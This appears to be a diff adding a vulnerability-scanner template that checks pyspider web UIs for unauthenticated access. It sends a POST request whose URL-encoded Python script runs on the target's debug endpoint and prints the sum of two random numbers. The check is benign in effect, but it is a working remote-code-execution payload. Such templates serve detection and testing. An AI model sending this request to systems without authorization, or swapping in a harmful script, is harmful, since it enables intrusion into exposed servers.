@@ -1,0 +1,24 @@
+id: poc-yaml-pyspider-unauthorized-access
+
+info:
+  name: poc-yaml-pyspider-unauthorized-access
+  author: we1x4n(https://we1x4n.github.io/)
+  severity: high
+  tags: xray-converted,unauth,ct-158373
+  reference:
+    - https://github.com/ianxtianxt/Pyspider-webui-poc
+
+http:
+  - raw:
+      - |
+        POST /debug/pyspidervulntest/run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str({{rand_int(1000, 9999)}}+%2B+{{rand_int(1000, 9999)}}))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
